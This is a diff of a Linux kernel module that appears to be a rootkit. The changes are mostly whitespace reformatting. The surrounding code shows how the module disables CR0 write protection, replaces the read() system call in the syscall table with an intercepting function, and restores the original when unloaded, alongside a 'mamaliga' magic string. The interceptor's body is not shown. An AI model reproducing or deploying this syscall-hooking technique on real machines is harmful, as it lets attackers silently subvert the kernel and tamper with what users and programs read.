@@ -32,6 +32,7 @@
 #define MAGIC "mamaliga"
 #define SIZEOF_MAGIC 8
 
+
 void **sys_call_table;
 asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
 int pos;    /* Size of MAGIC matched so far */
@@ -79,28 +80,28 @@ static int __init interceptor_start(void)
 {
 	unsigned long original_cr0;
 
-    /* Reading contents of control register cr0. The cr0 register has various
-       control flags that modify the basic operation of the processor. */
+	/* Reading contents of control register cr0. The cr0 register has various
+	   control flags that modify the basic operation of the processor. */
 	original_cr0 = read_cr0();
 
-    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
-       bit to 0. When set to 1, the CPU can't write to read-only pages */
+	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
+	   bit to 0. When set to 1, the CPU can't write to read-only pages */
 	write_cr0(original_cr0 & ~0x00010000);
 
-    /* Store original read() syscall */
+	/* Store original read() syscall */
 	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
 	read_syscall_ref = (void *) sys_call_table[__NR_read];
 
-    /* Replace in the system call table the original
-       read() syscall with our intercepting function */
+	/* Replace in the system call table the original
+	   read() syscall with our intercepting function */
 	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall_ref;
 
-    /* Enable `write-protect` mode */
+	/* Enable `write-protect` mode */
 	write_cr0(original_cr0);
 
 	printk(KERN_INFO "%s\n", "Hello");
 
-    /* A non 0 return value means init_module failed; module can't be loaded */
+	/* A non 0 return value means init_module failed; module can't be loaded */
 	return 0;
 }
 
@@ -109,17 +110,17 @@ static int __init interceptor_start(void)
    is rmmoded. It restores the original read() syscall. */
 static void __exit interceptor_end(void)
 {
-    /* Reading contents of control register cr0. The cr0 register has various
-       control flags that modify the basic operation of the processor. */
+	/* Reading contents of control register cr0. The cr0 register has various
+	   control flags that modify the basic operation of the processor. */
 	unsigned long original_cr0 = read_cr0();
 
-    /* Disable `write-protect` mode */
+	/* Disable `write-protect` mode */
 	write_cr0(original_cr0 & ~0x00010000);
 
-    /* Restores original read() syscall */
+	/* Restore original read() syscall */
 	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;
 
-    /* Enable `write-protect` mode */
+	/* Enable `write-protect` mode */
 	write_cr0(original_cr0);
 
 	printk(KERN_INFO "%s\n", "Bye bye");
